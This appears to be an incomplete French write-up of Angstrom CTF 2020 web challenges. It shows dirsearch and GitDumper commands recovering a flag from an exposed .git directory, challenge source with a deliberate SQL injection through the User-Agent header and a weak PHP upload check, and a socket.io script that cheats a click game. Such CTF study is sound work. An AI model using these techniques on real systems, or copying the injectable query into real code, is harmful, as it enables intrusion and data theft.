---
title: Angstrom CTF 2020
excerpt: This is a description
tags: [CTF, Angstrom, writeup, web]
categories: Write-ups
classes: wide
---

# Web 
## The Magic Word
![Challenge](/img/angstrom_2020_magic_word.png){: .center-image}
Dans ce premier challenge, rien de très compliqué. On affiche les sources de la page affiché. Et on tombe sur le script Javascript suivant: 
![Challenge](/img/angstrom_2020_magic_word_script.png){: .center-image}
Si la balise <p> avec l'id "magic" contient la texte "please give flag", ce dernier va être affiché.
On inspecte l'élément, on change la valeur de contenu dans la balise avec l'id "magic". Et voilà.
![Challenge](/img/angstrom_2020_magic_word_flag.png){: .center-image}

## Xmas Still Stands
![Challenge](/img/angstrom_2020_xmas.png){: .center-image}

## Consolation

## Git Good
```
	$ python dirsearch.py -u https://gitgood.2020.chall.actf.co -e * -b
[21:55:29] 200 -   15B  - /.git/COMMIT_EDITMSG
[21:55:29] 200 -   92B  - /.git/config
[21:55:29] 200 -   23B  - /.git/HEAD
[21:55:29] 200 -   73B  - /.git/description
[21:55:29] 200 -  537B  - /.git/index
[21:55:29] 200 -  240B  - /.git/info/exclude
[21:55:29] 200 -  353B  - /.git/logs/HEAD
[21:55:29] 301 -  195B  - /.git/logs/refs  ->  /.git/logs/refs/
[21:55:29] 301 -  207B  - /.git/logs/refs/heads  ->  /.git/logs/refs/heads/
[21:55:29] 200 -  353B  - /.git/logs/refs/heads/master
[21:55:29] 301 -  197B  - /.git/refs/heads  ->  /.git/refs/heads/
[21:55:29] 200 -   41B  - /.git/refs/heads/master
```
```
	$ bash gitdumper.sh https://gitgood.2020.chall.actf.co/.git/ clone
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating tmp/.git/
[+] Downloaded: HEAD
[+] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[+] Downloaded: info/refs
[+] Downloaded: info/exclude
[+] Downloaded: objects/e9/75d678f209da09fff763cd297a6ed8dd77bb35
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/6b/3c94c0b90a897f246f0f32dec3f5fd3e40abb5
[+] Downloaded: objects/94/02d143d3d7998247c95597b63598ce941e7bcb
[+] Downloaded: objects/b6/30430d9d393a6b143af2839fd24ac2118dba79
[+] Downloaded: objects/c2/658d7d1b31848c3b71960543cb0368e56cd4c7
[+] Downloaded: objects/63/8887a54973265c428cd51ce6dfd48f196d91c4
[+] Downloaded: objects/49/b319c37dc674bca682cab0f2506473dda6bd9a
[+] Downloaded: objects/78/9fa5caf452f5f6f25bfa9b1c0ab1d593dce1b3
[+] Downloaded: objects/8f/08af35205d0ba80e94b4f4306311039d62e138
[+] Downloaded: objects/24/7c9d491c0d2d6da5e93afcd0681b3edd7ccd70
[+] Downloaded: objects/0f/52598006f9cdb21db2f4c8d44d70535630289b

	$ cd clone
	$ git status
On branch master
Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
	deleted:    .gitignore
	deleted:    index.html
	deleted:    index.js
	deleted:    package-lock.json
	deleted:    package.json
	deleted:    thisistheflag.txt
```
```
	$ git checkout -- thisistheflag.txt
	$ cat thisistheflag.txt
There used to be a flag here...
```
```
	$ git log
commit e975d678f209da09fff763cd297a6ed8dd77bb35 (HEAD -> master)
Author: aplet123 <noneof@your.business>
Date:   Sat Mar 7 16:27:44 2020 +0000

    Initial commit

commit 6b3c94c0b90a897f246f0f32dec3f5fd3e40abb5
Author: aplet123 <noneof@your.business>
Date:   Sat Mar 7 16:27:24 2020 +0000

    haha I lied this is the actual initial commit
```
```
	$ git reset --hard 6b3c94c0b90a897f246f0f32dec3f5fd3e40abb5
	$ cat thisistheflag.txt
actf{b3_car3ful_wh4t_y0u_s3rve_wi7h}

btw this isn't the actual git server
```


## Secret Agents
```python
from flask import Flask, render_template, request

from .secret import host, user, passwd, dbname

import mysql.connector

dbconfig = {
	"host":host,
	"user":user,
	"passwd":passwd,
	"database":dbname
}

app = Flask(__name__)

@app.route("/")
def index():
	return render_template("index.html")


@app.route("/login")
def login():
	u = request.headers.get("User-Agent")

	conn = mysql.connector.connect(pool_name="poolofagents",
					pool_size=16,
					**dbconfig)

	cursor = conn.cursor()

	for r in cursor.execute("SELECT * FROM Agents WHERE UA='%s'"%(u), multi=True):
		if r.with_rows:
			res = r.fetchall()
			conn.close()
			break



	if len(res) == 0:
		return render_template("login.html", msg="stop! you're not allowed in here >:)")

	if len(res) > 1:
		return render_template("login.html", msg="hey! close, but no bananananananananana!!!! (there are many secret agents of course)")


	return render_template("login.html", msg="Welcome, %s"%(res[0][0]))

if __name__ == '__main__':
	app.run('0.0.0.0')
```
## Defund's Crypt
```php
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width,initial-scale=1">
        <link href="https://fonts.googleapis.com/css?family=Inconsolata|Special+Elite&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="/style.css">
        <title>Defund's Crypt</title>
    </head>
    <body>
        <!-- Defund was a big fan of open source so head over to /src.php -->
        <!-- Also I have a flag in the filesystem at /flag.txt but too bad you can't read it -->
        <h1>Defund's Crypt<span class="small">o</span></h1>
        <?php
            if ($_SERVER["REQUEST_METHOD"] === "POST") {
                // I just copy pasted this from the PHP site then modified it a bit
                // I'm not gonna put myself through the hell of learning PHP to write one lousy angstrom chall
                try {
                    if (
                        !isset($_FILES['imgfile']['error']) ||
                        is_array($_FILES['imgfile']['error'])
                    ) {
                        throw new RuntimeException('The crypt rejects you.');
                    }
                    switch ($_FILES['imgfile']['error']) {
                        case UPLOAD_ERR_OK:
                            break;
                        case UPLOAD_ERR_NO_FILE:
                            throw new RuntimeException('You must leave behind a memory lest you be forgotten forever.');
                        case UPLOAD_ERR_INI_SIZE:
                        case UPLOAD_ERR_FORM_SIZE:
                            throw new RuntimeException('People can only remember so much.');
                        default:
                            throw new RuntimeException('The crypt rejects you.');
                    }
                    if ($_FILES['imgfile']['size'] > 1000000) {
                        throw new RuntimeException('People can only remember so much..');
                    }
                    $finfo = new finfo(FILEINFO_MIME_TYPE);
                    if (false === $ext = array_search(
                        $finfo->file($_FILES['imgfile']['tmp_name']),
                        array(
                            '.jpg' => 'image/jpeg',
                            '.png' => 'image/png',
                            '.bmp' => 'image/bmp',
                        ),
                        true
                    )) {
                        throw new RuntimeException("Your memory isn't picturesque enough to be remembered.");
                    }
                    if (strpos($_FILES["imgfile"]["name"], $ext) === false) {
                        throw new RuntimeException("The name of your memory doesn't seem to match its content.");
                    }
                    $bname = basename($_FILES["imgfile"]["name"]);
                    $fname = sprintf("%s%s", sha1_file($_FILES["imgfile"]["tmp_name"]), substr($bname, strpos($bname, ".")));
                    if (!move_uploaded_file(
                        $_FILES['imgfile']['tmp_name'],
                        "./memories/" . $fname
                    )) {
                        throw new RuntimeException('Your memory failed to be remembered.');
                    }
                    http_response_code(301);
                    header("Location: /memories/" . $fname);
                } catch (RuntimeException $e) {
                    echo "<p>" . $e->getMessage() . "</p>";
                }
            }
        ?>
        <img src="crypt.jpg" height="300"/>
        <form method="POST" action="/" autocomplete="off" spellcheck="false" enctype="multipart/form-data">
            <p>Leave a memory:</p>
            <input type="file" id="imgfile" name="imgfile">
            <label for="imgfile" id="imglbl">Choose an image...</label>
            <input type="submit" value="Descend">
        </form>
        <script>
            imgfile.oninput = _ => {
                imgfile.classList.add("satisfied");
                imglbl.innerText = imgfile.files[0].name;
            };
        </script>
    </body>
</html>
```

## Woooosh
```javascript
const express = require("express");
const exphbs = require("express-handlebars");
const socket = require("socket.io");
const path = require("path");
const http = require("http");
const morgan = require("morgan");

const app = express();
const serv = http.createServer(app);
const io = socket.listen(serv);
const port = process.env.PORT || 60600;

function rand(bound) {
    return Math.floor(Math.random() * bound);
}

function genId() {
    const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
    return new Array(64).fill(0).map(v => chars[rand(chars.length)]).join``;
}

function genShapes() {
    return new Array(20).fill(0).map(v => ({ x: rand(500), y: rand(300) }));
}

function dist(a, b, c, d) {
    return Math.sqrt(Math.pow(c - a, 2), Math.pow(d - b, 2));
}

app.use(morgan("combined"));

app.use(express.static(path.join(__dirname, "public")));

const hbs = exphbs.create({
    extname: ".hbs",
    helpers: {}
});

app.engine("hbs", hbs.engine);
app.set("view engine", "hbs");
app.set("views", path.join(__dirname, "views"));

io.on("connection", client => {
    console.info(`Client connected [id=${client.id}]`)
    let game;
    setTimeout(function() {
        try {
            client.disconnect();
        } catch (err) {
            console.log("err", err);
        }
    }, 1 * 60 * 1000);
    function endGame() {
        try {
            if (game) {
                if (game.score > 20) {
                    client.emit(
                        "disp",
                        `Good job! You're so good at this! The flag is ${process.env.FLAG}!`
                    );
                } else {
                    client.emit(
                        "disp",
                        "Wow you're terrible at this! No flag for you!"
                    );
                }
                game = null;
            }
        } catch (err) {
            console.log("err", err);
        }
    }
    client.on("start", function() {
        try {
            console.info("Start message receive")
            if (game) {
                client.emit("disp", "Game already started.");
            } else {
                game = {
                    shapes: genShapes(),
                    score: 0
                };
                game.int = setTimeout(endGame, 10000);
                client.emit("shapes", game.shapes);
                client.emit("score", 0);
            }
        } catch (err) {
            console.log("err", err);
        }
    });
    client.on("click", function(x, y) {
        try {
            if (!game) {
                return;
            }
            if (typeof x != "number" || typeof y != "number") {
                return;
            }
            if (dist(game.shapes[0].x, game.shapes[1].y, x, y) < 10) {
                game.score++;
            }
            game.shapes = genShapes();
            client.emit("shapes", game.shapes);
            client.emit("score", game.score);
        } catch (err) {
            console.log("err", err);
        }
    });
    client.on("disconnect", function() {
        try {
            if (game) {
                clearTimeout(game.int);
            }
            game = null;
        } catch (err) {
            console.log("err", err);
        }
    });
});

app.get("/", function(req, res) {
    res.render("home");
});

serv.listen(port, function() {
    console.log(`Server listening on port ${port}!`);
});
```
Le script client: 
```javascript
const
    io = require("socket.io-client"),
    ioClient = io.connect("https://63333.p.aplet.me/");

ioClient.emit("start");

ioClient.on("shapes", function(shapes) {
    try {
        console.log(shapes[0].x, shapes[0].y)
        ioClient.emit("click", shapes[0].x, shapes[0].y)
    } catch (err) {
        console.log("err", err);
    }
});
ioClient.on("score", (msg) => console.info("Score: ", msg))
ioClient.on("disp", (msg) => console.info("Disp", msg))
```